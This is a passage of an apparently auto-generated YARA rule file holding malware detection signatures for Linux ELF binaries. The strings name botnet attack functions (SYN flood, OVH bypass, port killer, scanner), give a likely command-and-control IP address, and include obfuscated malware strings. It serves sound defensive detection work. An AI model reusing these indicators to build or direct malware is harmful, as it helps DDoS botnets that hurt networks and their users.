      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x15 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x16 = " text=  zombie% CPU (%s%s|%s, goid=, j0 = ,errno=. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82.5.4.99765625: type ::" ascii
      $x17 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x18 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s, fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>AdlamApr" ascii
      $x19 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x20 = "d hostname: multihop attemptedno child processesno locks availablenon-minimal lengthoperation canceledpermessage-deflateproxy-au" ascii

      $op0 = { 81 38 74 63 70 34 74 0c 81 38 74 63 70 36 0f 85 }
      $op1 = { 8b 89 fc ff ff ff 3b 61 08 76 20 83 ec 08 e8 26 }
      $op2 = { 8b 89 fc ff ff ff 3b 61 08 0f 86 d8 04 00 00 83 }
   condition:
      uint16(0) == 0x457f and filesize < 15000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_174 {
   meta:
      description = "Linux_174"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "67ed12e69ff6315929ab273668f3f72ad141dac0e64b2ad2a7be4b86c7c1e650"
   strings:
      $x1 = "  initfini.c $a crtstuff.c __EH_FRAME_BEGIN__ __JCR_LIST__ __do_global_dtors_aux $d completed.5105 __do_global_dtors_aux_fini_ar" ascii
      $x2 = "return_address _Unwind_Complete _Unwind_VRS_RegClass _Unwind_Ptr /home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/" ascii
      $s3 = "ame _Unwind_GetLanguageSpecificData next_unwind_byte unwind_UCB_from_context __gnu_unwind_execute /home/landley/aboriginal/abori" ascii
      $s4 = "set __pthread_mutex_lock __sigdelset util_stristr __xstat32_conv __uClibc_fini geteuid __getdents __GI_setsid memmove __gnu_Unwi" ascii
      $s5 = "k _stdio_openlist_dec_use __libc_select __GI_fgetc_unlocked __libc_nanosleep __GI_fgets_unlocked __pthread_mutex_init getuid mal" ascii
      $s6 = "etuid clock __fork __libc_sendto __GI_config_read strchr fake_time _Unwind_GetDataRelBase __GI_raise setsid __GI_inet_addr __GI_" ascii
      $s7 = " /home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm /home/landley/aboriginal/aboriginal" ascii
      $s8 = " /home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm /home/landley/aboriginal/aboriginal" ascii
      $s9 = "gismember write __fork_generation_pointer environ __GI_close fstat methods kill __pthread_mutex_trylock __GI___sigaddset __GI_br" ascii
      $s10 = "thread_mutex_unlock __GI_exit __app_fini attack_init attack_method_tcpsyn __exit_cleanup _memcpy rindex __GI_srandom_r __GI___si" ascii
      $s11 = "ta .bss .comment .debug_aranges .debug_pubnames .debug_info .debug_abbrev .debug_line .debug_frame .debug_str .debug_loc .debug_" ascii
      $s12 = "nd_Reason_Code unwind_phase2 _Unwind_decode_target2 phase2_vrs fpa_reg _Unwind_SetGR _Unwind_GetDataRelBase right fnoffset get_e" ascii
      $s13 = "scanner_init table_key realloc __gnu_Unwind_Resume _dl_tls_dtv_gaps __libc_send readdir64 __GI_recvfrom __GI_getrlimit listen at" ascii
      $s14 = "nwind-arm.c get_eit_entry unwind_phase2_forced unwind_phase2 __gnu_unwind_pr_common pr-support.c resolv.c thinkphp.c errno.c lib" ascii
      $s15 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm /home/landley/aboriginal/aboriginal/build/simple-c" ascii
      $s16 = " /home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S /home/landley/aboriginal/aboriginal/b" ascii
      $s17 = "GetTextRelBase __GI_signal stderr __GI_readdir64 attack_get_opt_int killer_kill_by_port __C_ctype_b __libc_setup_tls srandom att" ascii
      $s18 = "method_tcpstomp __register_frame_info __GI_getsockname attack_method_stdhex close __GI_config_close __libc_connect __GI_strlen _" ascii
      $s19 = "lotinfo static_dtv static_map dl-support.c brk.c getdents64.c _READ.c _WRITE.c _rfill.c _trans2r.c mempcpy.c sigjmp.c llseek.c u" ascii
      $s20 = "inet_aton attack_method_ovh _setjmp fgets_unlocked __GI_bind auth_table _exit strspn __libc_recv __getdents64 rand_alpha_str __l" ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule Linux_175 {
   meta:
      description = "Linux_175"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "35bd4cc4f59f2862d77edb92a124feb2b3810267bbbda4571172e9d3236abbf7"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x15 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x16 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x17 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x18 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x19 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii
      $x20 = ":[_outboundatomicor8attempts:bad indirbus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,filesempty url" ascii

      $op0 = { 8f a1 00 34 af a1 00 04 8f a1 00 18 af a1 00 08 }
      $op1 = { 24 46 00 01 3c 07 01 00 34 e7 01 93 70 27 40 02 }
      $op2 = { 05 10 25 3c 03 01 00 34 63 01 93 24 06 00 01 10 }
   condition:
      uint16(0) == 0x457f and filesize < 17000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_176 {
   meta:
      description = "Linux_176"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "57e879a44c0a5e230b9eb830f8b08157e98573bb624277939e9e358acbfe5b32"
   strings:
      $x1 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x2 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x8 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x9 = "adaptivestackstartbad Content-Lengthbad lfnode addressbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pco" ascii
      $x10 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x11 = "34694469519536141888238489627838134765625GODEBUG sys/cpu: no value specified for \"MapIter.Next called on exhausted iteratorTime" ascii
      $x12 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x13 = ":[_outboundatomicor8attempts:bad indirbad prunebus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,files" ascii
      $x14 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x15 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x16 = " text=  zombie% CPU (%s%s|%s, goid=, j0 = ,errno=. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82.5.4.99765625: type ::" ascii
      $x17 = ", not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat0123456789ABCDEF" ascii
      $x18 = "GC mark terminationGC work not flushedIDS_Binary_OperatorINADEQUATE_SECURITYINITIAL_WINDOW_SIZEKhitan_Small_ScriptMisdirected Re" ascii
      $x19 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s, fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii
      $x20 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii

      $op0 = { 48 39 d9 0f 8d fd fc ff ff 0f b6 34 08 40 80 fe }
      $op1 = { e8 0b 02 00 00 45 0f 57 ff 64 4c 8b 34 25 f8 ff }
      $op2 = { e8 06 01 00 00 45 0f 57 ff 64 4c 8b 34 25 f8 ff }
   condition:
      uint16(0) == 0x457f and filesize < 16000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_177 {
   meta:
      description = "Linux_177"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9698c680ba23b8e6f4685b8ecbe37768d839be88a131400eb151dde16f45c2c8"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x3 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x4 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x5 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x6 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x7 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x9 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x10 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x11 = "tls: certificate used with invalid signature algorithm -- not implementedtls: internal error: handshake returned an error but is" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x15 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x16 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x17 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x18 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x19 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x20 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii

      $op0 = { 81 22 40 e0 34 30 9d e5 03 30 82 e0 18 30 8d e5 }
      $op1 = { 0a 04 60 46 e0 34 30 8d e5 04 70 86 e0 07 00 56 }
      $op2 = { ea 01 40 a0 e3 34 10 8d e5 2c 00 8d e5 24 20 8d }
   condition:
      uint16(0) == 0x457f and filesize < 15000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_178 {
   meta:
      description = "Linux_178"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a8715804e6f577b794ff492af1f708a07949436accf25284375de5dd175e792a"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x3 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x4 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x5 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x6 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x7 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x9 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x10 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x11 = "tls: certificate used with invalid signature algorithm -- not implementedtls: internal error: handshake returned an error but is" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x15 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x16 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x17 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x18 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x19 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x20 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii

      $op0 = { 81 22 40 e0 34 30 9d e5 03 30 82 e0 18 30 8d e5 }
      $op1 = { 0a 04 60 46 e0 34 30 8d e5 04 70 86 e0 07 00 56 }
      $op2 = { ea 01 40 a0 e3 34 10 8d e5 2c 00 8d e5 24 20 8d }
   condition:
      uint16(0) == 0x457f and filesize < 15000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_179 {
   meta:
      description = "Linux_179"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "af80cdbc939114101d7bb5ae47912e44a6d70b17626582cc8b6c75be458ea3e6"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x15 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x16 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x17 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x18 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x19 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii
      $x20 = ":[_outboundatomicor8attempts:bad indirbus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,filesempty url" ascii

      $op0 = { 01 00 46 24 00 01 07 3c 93 01 e7 34 02 40 27 70 }
      $op1 = { 25 10 05 00 00 01 03 3c 93 01 63 34 01 00 06 24 }
      $op2 = { 30 00 a5 8f 34 00 a7 8f 25 18 00 00 25 40 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 17000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_180 {
   meta:
      description = "Linux_180"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e7ddf5d67ff227ea98aa4066fdfd841465bbbc89c5aa46e5e160173ed5759057"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x3 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x4 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x5 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x6 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x7 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x9 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x10 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x11 = "tls: certificate used with invalid signature algorithm -- not implementedtls: internal error: handshake returned an error but is" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x15 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x16 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x17 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x18 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x19 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x20 = " MB,  and  got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii

      $op0 = { 81 22 40 e0 34 30 9d e5 03 30 82 e0 18 30 8d e5 }
      $op1 = { 0a 04 60 46 e0 34 30 8d e5 04 70 86 e0 07 00 56 }
      $op2 = { ea 01 40 a0 e3 34 10 8d e5 2c 00 8d e5 24 20 8d }
   condition:
      uint16(0) == 0x457f and filesize < 16000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_181 {
   meta:
      description = "Linux_181"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3aab5141c5ebe903129303ebc35dd6d181c34f899ecd62fff98f7ca1d1e974ab"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s6 = "zkjtjaz" fullword ascii
      $s7 = "214.194.12.158" fullword ascii
      $s8 = "zltkaz" fullword ascii
      $s9 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" fullword ascii
      $s10 = ";<;(3uljktmtmZ" fullword ascii
      $s11 = "2(57?uohtjthmnitkklz" fullword ascii
      $s12 = "3.uljktmtmzr" fullword ascii
      $s13 = "2(57?uoktjthmjntkjiz" fullword ascii
      $s14 = "?()354uctkthz" fullword ascii
      $s15 = "3.uoimtilzr" fullword ascii
      $s16 = ";<;(3uoimtilZ" fullword ascii
      $s17 = "92/41?>Z" fullword ascii
      $s18 = "(?<(?)2`Z" fullword ascii
      $s19 = ")?(,?(`z>5);((?).Z" fullword ascii
      $s20 = "9544?9.354`Z" fullword ascii

      $op0 = { 3c 03 cc cc 34 63 cc cd 00 43 00 19 8f bc 00 18 }
      $op1 = { 14 60 00 10 3c 03 2a aa 8f a2 06 08 34 63 aa ab }
      $op2 = { af b9 00 34 8f 99 81 2c 02 80 b8 21 af b9 00 38 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_182 {
   meta:
      description = "Linux_182"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f45acaf7f1ed079fd03800f9f74a531586bf1ed7c26774ae2d3ce54226e74f67"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
